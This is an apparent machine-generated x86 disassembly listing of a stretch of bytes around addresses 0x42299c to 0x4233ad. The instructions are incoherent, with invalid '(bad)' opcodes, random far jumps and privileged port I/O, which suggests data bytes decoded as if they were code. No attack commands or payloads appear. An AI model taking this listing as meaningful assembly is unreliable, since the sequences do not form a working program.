  42299c:	repnz cmp ch,BYTE PTR [ecx-0x57]
  4229a0:	xchg   esp,eax
  4229a1:	ss stc 
  4229a3:	scas   eax,DWORD PTR es:[edi]
  4229a4:	jmp    0x50fe:0x34d13f38
  4229ab:	and    ah,BYTE PTR [ecx-0x51cee776]
  4229b1:	mov    eax,0xfb06e4
	...
  422a16:	xchg   esi,eax
  422a17:	push   0x18
  422a19:	mov    ah,bh
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0x9c608180
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    BYTE PTR [edi],ah
  422a2f:	xor    DWORD PTR [edi-0x62062b5f],0x61
  422a36:	dec    ecx
  422a37:	ins    BYTE PTR es:[edi],dx
  422a38:	scas   al,BYTE PTR es:[edi]
  422a39:	push   edi
  422a3a:	iret   
  422a3b:	adc    eax,0x9ef7f63
  422a40:	xchg   esp,eax
  422a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a42:	ins    DWORD PTR es:[edi],dx
  422a43:	out    0xe7,eax
  422a45:	xchg   BYTE PTR [ecx-0x3c],bh
  422a48:	lds    edx,FWORD PTR [eax+0x69d1745a]
  422a4e:	nop
  422a4f:	jmp    0x4cfb:0xebe7c592
  422a56:	inc    ebx
  422a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a58:	mov    bh,0xad
  422a5a:	fwait
  422a5b:	sub    DWORD PTR [edi+edx*4-0x21],esi
  422a5f:	rol    BYTE PTR [esp+ebp*2+0x43b4834a],cl
  422a66:	clc    
  422a67:	jo     0x422a34
  422a69:	scas   eax,DWORD PTR es:[edi]
  422a6a:	vpaddd xmm6,xmm5,XMMWORD PTR [ecx]
  422a6e:	mov    ah,0xd
  422a70:	jno    0x422a4d
  422a72:	xchg   BYTE PTR [edx-0x738e6513],dh
  422a78:	mov    BYTE PTR [edx+0x69],bl
  422a7b:	sbb    BYTE PTR [ebx+0x5eeb89d3],cl
  422a81:	pop    es
  422a82:	push   edi
  422a83:	outs   dx,DWORD PTR ds:[esi]
  422a84:	in     al,dx
  422a85:	div    ebp
  422a87:	jmp    0x422a1e
  422a89:	ja     0x422ae9
  422a8b:	inc    eax
  422a8c:	xchg   edx,eax
  422a8d:	mov    esi,0xdb281361
  422a92:	scas   al,BYTE PTR es:[edi]
  422a93:	xchg   esi,eax
  422a94:	mov    al,ds:0x2d4df14b
  422a99:	xor    esi,DWORD PTR [edi+eax*1]
  422a9c:	popf   
  422a9d:	popa   
  422a9e:	xchg   ebx,eax
  422a9f:	mov    edi,0xc1f753c4
  422aa4:	out    dx,ax
  422aa6:	sbb    al,0x3f
  422aa8:	xchg   DWORD PTR [eax],esp
  422aaa:	das    
  422aab:	xlat   BYTE PTR ds:[ebx]
  422aac:	add    al,0x3a
  422aae:	rcr    esi,cl
  422ab0:	arpl   WORD PTR ss:[edx],bp
  422ab3:	mov    eax,ds:0xdc3b876d
  422ab8:	inc    esi
  422ab9:	or     dh,BYTE PTR [edi]
  422abb:	xor    BYTE PTR [ecx-0x197af86b],0xb3
  422ac2:	lods   eax,DWORD PTR ds:[esi]
  422ac3:	scas   al,BYTE PTR es:[edi]
  422ac4:	adc    esi,esi
  422ac6:	icebp  
  422ac7:	sub    eax,0x899aa7fc
  422acc:	test   BYTE PTR [edx-0x57],0xf1
  422ad0:	(bad)  
  422ad1:	out    0x18,al
  422ad3:	pusha  
  422ad4:	call   0xa2f0:0xefbd60dd
  422adb:	add    eax,esi
  422add:	gs imul eax,edx,0xb179aa4
  422ae4:	lahf   
  422ae5:	add    eax,edx
  422ae7:	sti    
  422ae8:	push   esp
  422ae9:	outs   dx,DWORD PTR ds:[esi]
  422aea:	push   edx
  422aeb:	pop    es
  422aec:	lock out dx,eax
  422aee:	out    dx,eax
  422aef:	add    ecx,ebx
  422af1:	imul   esi,eax,0xfffffff9
  422af4:	add    esp,eax
  422af6:	dec    esp
  422af7:	add    al,0x5d
  422af9:	rcl    DWORD PTR [ecx-0x522919f2],cl
  422aff:	stos   DWORD PTR es:[edi],eax
  422b00:	aam    0x2f
  422b02:	sub    bl,al
  422b04:	arpl   WORD PTR [ebx],sp
  422b06:	sbb    eax,0xdaf03586
  422b0b:	cmp    DWORD PTR [ebx-0x408499f6],esp
  422b11:	mov    edx,0x27435c1c
  422b16:	stos   BYTE PTR es:[edi],al
  422b17:	and    DWORD PTR [eax-0x42e74c9a],ecx
  422b1d:	sub    ecx,esi
  422b1f:	in     al,dx
  422b20:	loopne 0x422ae0
  422b22:	mov    ch,0x8c
  422b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b25:	lock fist WORD PTR [edx+edi*8+0x53]
  422b2a:	pushf  
  422b2b:	imul   ebp,DWORD PTR [esi-0x3c],0xfbb01156
  422b32:	pop    esi
  422b33:	neg    BYTE PTR [edi+0x0]
	...
  422b95:	add    BYTE PTR [edi+esi*1+0x4a],al
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx+0x412a631c]
  422ba5:	les    edi,FWORD PTR [edi]
  422ba7:	jno    0x422baa
  422ba9:	add    BYTE PTR [edi],al
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    BYTE PTR [edi-0x63],ch
  422bb0:	repnz test al,0x4e
  422bb3:	sub    cl,BYTE PTR [ecx+0x2b30e6e4]
  422bb9:	jae    0x422b74
  422bbb:	outs   dx,BYTE PTR ds:[esi]
  422bbc:	ficom  DWORD PTR [esi-0x209ab46a]
  422bc2:	sbb    BYTE PTR [edx-0xd],0xf5
  422bc6:	xor    BYTE PTR [eax],dh
  422bc8:	scas   eax,DWORD PTR es:[edi]
  422bc9:	ins    DWORD PTR es:[edi],dx
  422bca:	inc    esi
  422bcb:	repnz sbb ebx,DWORD PTR [ebx]
  422bce:	xchg   esp,eax
  422bcf:	repnz ins BYTE PTR es:[edi],dx
  422bd1:	call   DWORD PTR [ebp+0x45529394]
  422bd7:	jo     0x422b6b
  422bd9:	call   DWORD PTR [edx]
  422bdb:	push   ebp
  422bdc:	sbb    eax,edx
  422bde:	mov    DWORD PTR [edi],eax
  422be0:	adc    cl,al
  422be2:	fiadd  DWORD PTR [edi+0x9]
  422be5:	cmc    
  422be6:	out    0x95,eax
  422be8:	out    dx,al
  422be9:	jp     0x422c37
  422beb:	das    
  422bec:	pop    esp
  422bed:	nop
  422bee:	xchg   esi,eax
  422bef:	ret    0x3628
  422bf2:	push   esi
  422bf3:	or     bh,BYTE PTR [eax-0x13]
  422bf6:	retf   
  422bf7:	xchg   DWORD PTR [edi-0x64],esp
  422bfa:	dec    ebx
  422bfb:	int3   
  422bfc:	sbb    BYTE PTR [edx+0x23e09032],bl
  422c02:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  422c04:	cdq    
  422c05:	adc    ah,BYTE PTR fs:[ebx-0x494ccbcc]
  422c0c:	mov    esp,0x7ecfc46a
  422c11:	xor    eax,0xb88f8f94
  422c16:	enter  0xd50c,0x4d
  422c1a:	dec    ecx
  422c1b:	inc    edi
  422c1c:	push   eax
  422c1d:	(bad)  
  422c1e:	aam    0xf2
  422c20:	out    0xcb,eax
  422c22:	mov    dl,0x5
  422c24:	dec    ebx
  422c25:	test   BYTE PTR [ebx],dl
  422c27:	xchg   BYTE PTR [ebp-0x2581283f],dh
  422c2d:	shr    DWORD PTR [esi],1
  422c2f:	popf   
  422c30:	loope  0x422c8c
  422c32:	loope  0x422c1f
  422c34:	outs   dx,DWORD PTR ds:[esi]
  422c35:	jmp    0x422c52
  422c37:	ins    DWORD PTR es:[edi],dx
  422c38:	and    bh,BYTE PTR [edi+0x24b9cafc]
  422c3e:	loop   0x422c90
  422c40:	int3   
  422c41:	ret    
  422c42:	mov    al,0xf2
  422c44:	or     esi,DWORD PTR [ebx+0x4c]
  422c47:	mov    BYTE PTR [edx-0x54],bl
  422c4a:	stc    
  422c4b:	iret   
  422c4c:	(bad)  
  422c4d:	push   ebx
  422c4e:	lahf   
  422c4f:	aad    0xbe
  422c51:	aam    0x75
  422c53:	in     al,0xc
  422c55:	lahf   
  422c56:	lods   eax,DWORD PTR ds:[esi]
  422c57:	cs pushf 
  422c59:	xchg   DWORD PTR [ecx],ecx
  422c5b:	push   es
  422c5c:	ins    DWORD PTR es:[edi],dx
  422c5d:	ret    0x760f
  422c60:	test   eax,0x7fbbfd9d
  422c65:	inc    ecx
  422c66:	xor    al,0x29
  422c68:	pop    eax
  422c69:	sbb    DWORD PTR [ecx+0x3a],edi
  422c6c:	or     DWORD PTR [ebx-0x4b],0x974cf508
  422c73:	mov    esp,0x976cd737
  422c78:	test   eax,0x7dd817c1
  422c7d:	mov    WORD PTR [edi],?
  422c7f:	inc    DWORD PTR [ebx]
  422c81:	outs   dx,DWORD PTR ds:[esi]
  422c82:	int    0x5f
  422c84:	dec    edx
  422c85:	leave  
  422c86:	ss in  eax,dx
  422c88:	test   BYTE PTR [ebx-0x2655da6d],al
  422c8e:	xor    eax,ebx
  422c90:	(bad)  
  422c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c92:	mul    BYTE PTR [ebx]
  422c94:	jb     0x422c8d
  422c96:	mov    ecx,0x74898f06
  422c9b:	mov    BYTE PTR [ebx+0xc],ch
  422c9e:	or     DWORD PTR [ebx],0xffffffd0
  422ca1:	repz jmp 0x422ce5
  422ca4:	outs   dx,BYTE PTR ds:[esi]
  422ca5:	pop    ss
  422ca6:	fistp  WORD PTR [esi+eax*2+0x1e]
  422caa:	icebp  
  422cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cac:	ret    
  422cad:	push   eax
  422cae:	fistp  QWORD PTR [edx]
  422cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cb1:	push   es
  422cb2:	sub    DWORD PTR ds:0x5a,edx
	...
  422d14:	add    BYTE PTR [eax],al
  422d16:	mov    edi,0x626d60bd
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	fistp  WORD PTR [edi]
  422d23:	push   ss
  422d24:	and    eax,DWORD PTR fs:[esi+0x72]
  422d28:	add    DWORD PTR [eax],eax
  422d2a:	pop    es
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    BYTE PTR [eax+ecx*4+0x45],dh
  422d31:	mov    cl,0x52
  422d33:	push   edx
  422d34:	popf   
  422d35:	xor    al,0x4e
  422d37:	adc    al,0xc2
  422d39:	mov    DWORD PTR [ecx],ecx
  422d3b:	lods   al,BYTE PTR ds:[esi]
  422d3c:	(bad)  [ecx]
  422d3e:	idiv   DWORD PTR [esi+0x29]
  422d41:	or     cl,BYTE PTR [edi]
  422d43:	cmp    DWORD PTR [eax+0x7a],0xfa5749f8
  422d4a:	cwde   
  422d4b:	fmul   DWORD PTR [eax-0x23]
  422d4e:	dec    ebp
  422d4f:	popa   
  422d50:	jbe    0x422d27
  422d52:	inc    edx
  422d53:	add    edi,DWORD PTR [esi-0x17679e75]
  422d59:	out    0xd,eax
  422d5b:	xlat   BYTE PTR ds:[ebx]
  422d5c:	sbb    DWORD PTR [ecx+0x29eb7704],0xc805ff00
  422d66:	push   cs
  422d67:	add    al,0x11
  422d69:	les    esp,FWORD PTR [ebx+0x2]
  422d6c:	push   esi
  422d6d:	nop
  422d6e:	(bad)  
  422d6f:	pop    ebp
  422d70:	loope  0x422dd6
  422d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d73:	in     al,dx
  422d74:	add    ebx,esp
  422d76:	pop    ecx
  422d77:	push   edx
  422d78:	mov    ecx,0xdafcdaff
  422d7d:	ss mov esp,0x2c56c63e
  422d83:	pop    ebp
  422d84:	sub    esp,0x75
  422d87:	jg     0x422de6
  422d89:	dec    ebx
  422d8a:	fdivr  QWORD PTR ds:0x26b797
  422d90:	sbb    dl,BYTE PTR [esi-0x1ccc9431]
  422d96:	push   esp
  422d97:	setp   BYTE PTR [ebx+0x6abe2e43]
  422d9e:	sbb    edx,esp
  422da0:	imul   eax,DWORD PTR [ecx+0x1cf1d35d],0x96dd55e4
  422daa:	call   DWORD PTR [ebx]
  422dac:	pop    ss
  422dad:	fstp   QWORD PTR [eax+0x11ecb6d8]
  422db3:	mov    dh,0x33
  422db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422db6:	mov    eax,0x7f59aca3
  422dbb:	fiadd  DWORD PTR [edi+0x3be55915]
  422dc1:	mov    esi,0xeafc15a5
  422dc6:	pop    esi
  422dc7:	push   ebp
  422dc8:	pushf  
  422dc9:	push   eax
  422dca:	lea    eax,[ecx-0x73]
  422dcd:	popf   
  422dce:	repz mov eax,0x9a175518
  422dd4:	dec    edx
  422dd5:	xchg   ebx,eax
  422dd6:	inc    esi
  422dd7:	add    al,0xf
  422dd9:	or     al,0x92
  422ddb:	push   edi
  422ddc:	mov    ah,0xa9
  422dde:	push   edi
  422ddf:	push   esi
  422de0:	ss add eax,0x7aaf1ee
  422de6:	je     0x422e31
  422de8:	mov    cl,0xba
  422dea:	ror    BYTE PTR [eax+0x1877370],cl
  422df0:	push   0x62
  422df2:	or     al,0x4e
  422df4:	jmp    0x5079756d
  422df9:	inc    ebp
  422dfa:	push   edi
  422dfb:	add    al,0x49
  422dfd:	int    0xb3
  422dff:	jnp    0x422e5d
  422e01:	jne    0x422e10
  422e03:	cmp    ebx,eax
  422e05:	add    edx,edi
  422e07:	push   es
  422e08:	and    ah,BYTE PTR [edx-0x789fb476]
  422e0e:	cmp    DWORD PTR [esi],eax
  422e10:	mov    ds:0x3c7253e3,al
  422e15:	loop   0x422dfb
  422e17:	mov    cl,0x78
  422e19:	call   DWORD PTR [esi+0x2547f7f6]
  422e1f:	mov    WORD PTR [ebx-0x27],ss
  422e22:	into   
  422e23:	adc    eax,DWORD PTR [esi+edi*2-0x63063585]
  422e2a:	mov    dl,BYTE PTR [esi+0x71]
  422e2d:	mov    dl,0xf4
  422e2f:	pop    esp
  422e30:	adc    BYTE PTR [ecx+0xeb6e51],0x0
	...
  422e93:	add    BYTE PTR [eax],al
  422e95:	add    BYTE PTR [ebx-0x21e677ab],al
  422e9b:	fst    QWORD PTR [ebx+0x2a9187df]
  422ea1:	mov    ebx,0xa085d761
  422ea6:	dec    ebp
  422ea7:	jae    0x422eaa
  422ea9:	add    BYTE PTR [edi],al
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    ah,bl
  422eaf:	xchg   edi,eax
  422eb0:	push   eax
  422eb1:	ins    BYTE PTR es:[edi],dx
  422eb2:	scas   al,BYTE PTR es:[edi]
  422eb3:	pop    ecx
  422eb4:	aas    
  422eb5:	adc    eax,0xa278c9dd
  422eba:	pusha  
  422ebb:	mov    bh,0x8a
  422ebd:	neg    DWORD PTR [ecx+0x4f]
  422ec0:	nop
  422ec1:	jne    0x422e59
  422ec3:	mov    ds:0xd4f3de93,eax
  422ec8:	push   ds
  422ec9:	sub    eax,0x8f883611
  422ece:	retf   
  422ecf:	inc    ebp
  422ed0:	mov    al,ds:0x45bdb08c
  422ed5:	dec    ebx
  422ed6:	jbe    0x422f02
  422ed8:	outs   dx,DWORD PTR ds:[esi]
  422ed9:	lahf   
  422eda:	mov    bh,0x37
  422edc:	sbb    DWORD PTR [ebx+0x7de7105b],ecx
  422ee2:	outs   dx,DWORD PTR ds:[esi]
  422ee3:	or     ecx,DWORD PTR [eax]
  422ee5:	cli    
  422ee6:	call   0xe1ccc904
  422eeb:	or     ebx,edx
  422eed:	arpl   dx,si
  422eef:	ret    0x7e11
  422ef2:	xchg   ecx,eax
  422ef3:	cmp    al,0xd7
  422ef5:	jmp    0x422e99
  422ef7:	aas    
  422ef8:	jb     0x422f73
  422efa:	cmp    dh,BYTE PTR [edi]
  422efc:	inc    ebx
  422efd:	fdivr  QWORD PTR [ecx]
  422eff:	clc    
  422f00:	adc    edx,DWORD PTR [eax]
  422f02:	add    al,0xc5
  422f04:	jbe    0x422f71
  422f06:	iret   
  422f07:	cmp    edi,edi
  422f09:	xlat   BYTE PTR ds:[ebx]
  422f0a:	test   BYTE PTR [ebx-0x6d],0xd
  422f0e:	jbe    0x422eba
  422f10:	retf   0xd839
  422f13:	and    al,0x53
  422f15:	xchg   BYTE PTR [esi],bh
  422f17:	rol    BYTE PTR [ebp+0x79cbd945],1
  422f1d:	jns    0x422ec2
  422f1f:	push   0xffffffa1
  422f21:	ja     0x422f30
  422f23:	cmc    
  422f24:	iret   
  422f25:	cmc    
  422f26:	pushf  
  422f27:	mov    eax,ds:0x670195eb
  422f2c:	fstp   st(4)
  422f2e:	cmp    DWORD PTR [edi],0xffffffd3
  422f31:	fisttp QWORD PTR [ecx+0x5c]
  422f34:	rcl    DWORD PTR [ebx+0x21d6b48],1
  422f3a:	mov    ch,0xb0
  422f3c:	add    bl,al
  422f3e:	mov    cl,0xb5
  422f40:	lahf   
  422f41:	data16 loope 0x422ec5
  422f44:	mov    ah,0xaa
  422f46:	fsub   DWORD PTR [edi+edx*2+0x26]
  422f4a:	cld    
  422f4b:	js     0x422f67
  422f4d:	jnp    0x422f8e
  422f4f:	test   al,0x24
  422f51:	hlt    
  422f52:	and    al,0xe0
  422f54:	jge    0x422fc7
  422f56:	jmp    0x422ee4
  422f58:	and    BYTE PTR [esi-0x8ddfca9],dh
  422f5e:	dec    esi
  422f5f:	push   ss
  422f60:	pop    edi
  422f61:	retf   
  422f62:	sahf   
  422f63:	mov    ecx,edx
  422f65:	dec    edi
  422f66:	ins    BYTE PTR es:[edi],dx
  422f67:	inc    edx
  422f68:	jl     0x422fc9
  422f6a:	(bad)  
  422f6b:	imul   ebp,DWORD PTR [ebx+0xf],0x7b0de0e
  422f72:	clc    
  422f73:	jb     0x422fef
  422f75:	push   ecx
  422f76:	shl    DWORD PTR [esi],0x6e
  422f79:	sub    al,0x82
  422f7b:	in     al,0xa3
  422f7d:	dec    eax
  422f7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f7f:	ret    
  422f80:	fnstsw WORD PTR [ecx-0x3083c4db]
  422f86:	inc    esi
  422f87:	jbe    0x422ff0
  422f89:	aas    
  422f8a:	sub    eax,ebx
  422f8c:	jne    0x422faf
  422f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f90:	inc    edx
  422f91:	or     ebp,edx
  422f93:	mov    ah,0xdc
  422f95:	adc    al,0x1f
  422f97:	sbb    eax,0x83d58661
  422f9c:	dec    esp
  422f9d:	jne    0x422f56
  422f9f:	mov    es,WORD PTR [esi]
  422fa1:	cmc    
  422fa2:	adc    esp,DWORD PTR [esi+0x55]
  422fa5:	jmp    0x7c35:0xb6bcbf73
  422fac:	dec    esi
  422fad:	push   edx
  422fae:	gs repz in eax,0x7f
  422fb2:	add    BYTE PTR [eax+0x25],dl
	...
  423014:	add    BYTE PTR [eax],al
  423016:	inc    esi
  423017:	in     al,0x62
  423019:	mov    dl,ah
  42301b:	mov    gs,esi
  42301d:	out    dx,al
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR ds:0x54e4f8a7,esp
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    BYTE PTR [ecx+0x6b5146d3],bl
  423033:	xor    BYTE PTR [ecx-0x6fe07aa2],ch
  423039:	retf   
  42303a:	(bad)  
  42303b:	jmp    0x422ff3
  42303d:	cmp    ch,BYTE PTR [esi]
  42303f:	in     al,dx
  423040:	and    ecx,edi
  423042:	jle    0x42309a
  423044:	aas    
  423045:	xor    eax,0xb1e8fe97
  42304a:	imul   esi,DWORD PTR [ebp+0x22],0x34
  42304e:	es cmp edi,ebx
  423051:	mov    ebx,0xf4082189
  423056:	mov    ah,0xbf
  423058:	pop    es
  423059:	adc    al,0xa8
  42305b:	ss inc ebp
  42305d:	mov    DWORD PTR [ebx+eiz*1-0x14f0de08],esp
  423064:	ins    BYTE PTR es:[edi],dx
  423065:	mov    al,0xbc
  423067:	shr    DWORD PTR ds:0xcce873eb,cl
  42306d:	xchg   ecx,eax
  42306e:	jmp    0x359ace3f
  423073:	jbe    0x42308c
  423075:	test   al,0x3b
  423077:	iret   
  423078:	outs   dx,DWORD PTR ds:[esi]
  423079:	jne    0x4230b5
  42307b:	xchg   esp,eax
  42307c:	sbb    eax,edi
  42307e:	(bad)  
  42307f:	mov    eax,0x59a02245
  423084:	cmp    ah,0xb
  423087:	test   DWORD PTR [edx+eax*4+0x29736c6e],ebp
  42308e:	sub    esi,edx
  423090:	fwait
  423091:	inc    esp
  423092:	mov    dh,0xd0
  423094:	mov    eax,ds:0x58ff31c2
  423099:	outs   dx,BYTE PTR ds:[esi]
  42309b:	int3   
  42309c:	jae    0x423039
  42309e:	loopne 0x4230b6
  4230a0:	mov    esp,0xc13d2bdb
  4230a5:	ins    DWORD PTR es:[edi],dx
  4230a6:	or     dh,0x32
  4230a9:	xchg   DWORD PTR ds:0x3922565b,edx
  4230af:	sti    
  4230b0:	push   ebp
  4230b1:	iret   
  4230b2:	mov    esi,0x85fbe856
  4230b7:	or     al,0xad
  4230b9:	inc    esp
  4230ba:	mov    edx,0xa499f4d6
  4230bf:	stos   BYTE PTR es:[edi],al
  4230c0:	cmp    DWORD PTR [eax+eiz*8-0x16],edx
  4230c4:	inc    eax
  4230c5:	aad    0xdc
  4230c7:	xor    eax,DWORD PTR gs:[esi-0x7842d81d]
  4230ce:	(bad)  
  4230cf:	push   ebx
  4230d0:	pop    ds
  4230d1:	mov    dh,0xb8
  4230d3:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230d5:	call   0x10a0:0x8f6a2ea1
  4230dc:	out    dx,eax
  4230dd:	jg     0x4230c0
  4230df:	pop    eax
  4230e0:	sbb    al,0x4a
  4230e2:	cdq    
  4230e3:	push   edi
  4230e4:	pop    ds
  4230e5:	push   edi
  4230e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230e7:	inc    edi
  4230e8:	sbb    esp,DWORD PTR [eax]
  4230ea:	shl    BYTE PTR [ebx],cl
  4230ec:	xor    BYTE PTR [edi+ecx*8+0x6b],ah
  4230f0:	pop    eax
  4230f1:	mov    edi,0xcf121ae3
  4230f6:	add    dh,BYTE PTR [esi-0x2162e6de]
  4230fc:	sub    edx,DWORD PTR [ebp-0x3e209a58]
  423102:	ss jae 0x4230bf
  423105:	xor    bh,ch
  423107:	fs scas al,BYTE PTR es:[edi]
  423109:	fadd   st(6),st
  42310b:	mov    eax,ds:0xcc24ea6a
  423110:	jns    0x423104
  423112:	je     0x423102
  423114:	xchg   esi,eax
  423115:	add    eax,0x32a58850
  42311a:	xlat   BYTE PTR ds:[ebx]
  42311b:	mov    ecx,0x50ef0bc2
  423120:	shr    BYTE PTR [ebp+0x67],0x96
  423124:	sub    al,0x67
  423126:	in     al,0xcf
  423128:	int    0x3a
  42312a:	std    
  42312b:	ret    0x32c
  42312e:	sub    DWORD PTR [ecx],esp
  423130:	sbb    ebx,DWORD PTR [edi]
  423132:	outs   dx,BYTE PTR ds:[esi]
  423133:	xor    esp,eax
	...
  423195:	add    BYTE PTR [ecx-0xf],bh
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	or     BYTE PTR [eax],0xc7
  4231a4:	xor    edi,DWORD PTR [edi+0x5b]
  4231a7:	jne    0x4231aa
  4231a9:	add    BYTE PTR [edi],al
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    BYTE PTR [ebx],ch
  4231af:	sti    
  4231b0:	rcl    DWORD PTR [eax-0x5c],cl
  4231b3:	lahf   
  4231b4:	in     eax,0x48
  4231b6:	inc    esp
  4231b7:	vpshufb zmm5{k1}{z},zmm5,zmm5
  4231bd:	sub    ecx,DWORD PTR [eax+0x4f]
  4231c0:	inc    ecx
  4231c1:	add    ebx,DWORD PTR [ebx+0x1f]
  4231c4:	aas    
  4231c5:	gs in  eax,0x65
  4231c8:	loopne 0x42322d
  4231ca:	sbb    BYTE PTR [esi-0x6],ch
  4231cd:	mov    edi,0x4fb01655
  4231d2:	addr16 xchg edx,eax
  4231d4:	call   0xdcd64f5d
  4231d9:	and    bl,BYTE PTR [ebp+edx*2-0x188ee751]
  4231e0:	push   esi
  4231e1:	cdq    
  4231e2:	jb     0x423178
  4231e4:	inc    esp
  4231e5:	retf   
  4231e6:	inc    esi
  4231e7:	push   edi
  4231e8:	mov    esp,DWORD PTR [eax-0x5d]
  4231eb:	ins    BYTE PTR es:[edi],dx
  4231ec:	adc    ah,BYTE PTR [eax-0x5b2fed72]
  4231f2:	dec    ebx
  4231f3:	jno    0x4231ee
  4231f5:	ja     0x4231ed
  4231f7:	push   edi
  4231f8:	test   al,0x41
  4231fa:	add    eax,DWORD PTR [edi-0x4b490784]
  423200:	ret    0x4e90
  423203:	test   BYTE PTR fs:[esi-0x4fa8096b],al
  42320a:	mov    ah,0x26
  42320c:	adc    ebx,DWORD PTR ds:0xd044e0a3
  423212:	js     0x4231f4
  423214:	xchg   BYTE PTR [ecx],ch
  423216:	sbb    cl,BYTE PTR [esi+0x5e]
  423219:	jecxz  0x423242
  42321b:	cdq    
  42321c:	imul   edi,DWORD PTR [ebx],0x374e2b6b
  423222:	aam    0x54
  423224:	das    
  423225:	pop    es
  423226:	lds    esi,FWORD PTR [ecx+0x7d]
  423229:	sub    ecx,eax
  42322b:	ja     0x423217
  42322d:	sbb    al,BYTE PTR [eax-0x7e]
  423230:	cmp    BYTE PTR ds:0xca0714d2,0x58
  423237:	inc    esp
  423238:	pushf  
  423239:	mov    bl,ah
  42323b:	outs   dx,BYTE PTR ds:[esi]
  42323c:	popf   
  42323d:	push   ds
  42323e:	pop    DWORD PTR [eax+0x7a67f6d9]
  423244:	lods   al,BYTE PTR ds:[esi]
  423245:	(bad)  
  423247:	imul   ebp
  423249:	xchg   ebx,eax
  42324a:	xchg   ebp,eax
  42324b:	loop   0x4231da
  42324d:	xor    ebp,DWORD PTR [edi+0x6]
  423250:	pop    edx
  423251:	mov    esp,0x9c8246b
  423256:	loope  0x4232b5
  423258:	push   esi
  423259:	outs   dx,BYTE PTR ds:[esi]
  42325a:	or     BYTE PTR [esi+ebp*8],ch
  42325d:	mov    al,0xd5
  42325f:	pop    ebp
  423260:	jle    0x42327d
  423262:	aad    0xc2
  423264:	ins    DWORD PTR es:[edi],dx
  423265:	jp     0x423201
  423267:	(bad)  
  423268:	adc    BYTE PTR [ebx-0x618ab1fe],dl
  42326e:	cmc    
  42326f:	cld    
  423270:	les    ebp,FWORD PTR [esi+eiz*2-0x3351d9a7]
  423277:	cmp    eax,0xfa72846e
  42327c:	loope  0x42322e
  42327e:	push   cs
  42327f:	in     eax,0xbc
  423281:	inc    eax
  423282:	imul   ebp,DWORD PTR [edi],0x14
  423285:	add    DWORD PTR [ecx-0x3fa28659],eax
  42328b:	push   ebx
  42328c:	sub    BYTE PTR [edi],0x74
  42328f:	or     eax,DWORD PTR ds:0x162ae01a
  423295:	jb     0x4232be
  423297:	pop    esi
  423298:	pop    edi
  423299:	out    0x20,eax
  42329b:	cs xchg bh,dl
  42329e:	jae    0x4232f8
  4232a0:	push   ds
  4232a1:	dec    esi
  4232a2:	shl    BYTE PTR [ebx+0x77a8b899],1
  4232a8:	add    eax,0x8e02ca08
  4232ad:	cmp    edi,0xe03f2e27
  4232b3:	pushf  
  4232b4:	xor    al,BYTE PTR [eax]
	...
  423316:	clc    
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	adc    eax,0x6247d94c
  423327:	jbe    0x42332a
  423329:	add    BYTE PTR [edi],al
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    BYTE PTR [edi+esi*4-0xda194cb],ch
  423334:	mov    BYTE PTR [edx-0x52d55f4e],0x78
  42333b:	add    eax,0xba9bd7e2
  423340:	test   al,0x8b
  423342:	xchg   esp,eax
  423343:	shl    BYTE PTR [eax],1
  423345:	or     eax,0xd24a53bc
  42334a:	test   al,0x20
  42334c:	cmp    DWORD PTR [ebx],ebx
  42334e:	je     0x423344
  423350:	mov    ebp,0x4164705
  423355:	push   ds
  423356:	sbb    DWORD PTR ds:0xa03dbfe0,ebx
  42335c:	mov    dl,0x5e
  42335e:	fadd   QWORD PTR [esi+0x0]
  423361:	pop    esp
  423362:	push   es
  423363:	jae    0x42338d
  423365:	and    eax,DWORD PTR [ebx+0x3ab76dab]
  42336b:	sbb    al,0xf2
  42336d:	fld    TBYTE PTR [ecx]
  42336f:	mov    ah,0xbd
  423371:	xor    esp,DWORD PTR ds:0x54c2aa85
  423377:	push   ecx
  423378:	inc    DWORD PTR [ebx-0x10fc8649]
  42337e:	sbb    bh,cl
  423380:	add    edi,ecx
  423382:	sahf   
  423383:	pop    esp
  423384:	jb     0x4233ae
  423386:	sub    DWORD PTR [ebx+0x1f63d2a8],edi
  42338c:	ss jmp 0x36bba7b8
  423392:	adc    eax,0xb298d13f
  423397:	pop    ecx
  423398:	xchg   esp,eax
  423399:	add    ebx,edx
  42339b:	inc    ebx
  42339c:	and    edx,DWORD PTR [ebx]
  42339e:	mov    WORD PTR [edx+0x13],?
  4233a1:	div    DWORD PTR [esi+0x37bad16b]
  4233a7:	jbe    0x4233d1
  4233a9:	xchg   ecx,eax
  4233aa:	gs aam 0x48
  4233ad:	in     eax,0x2a
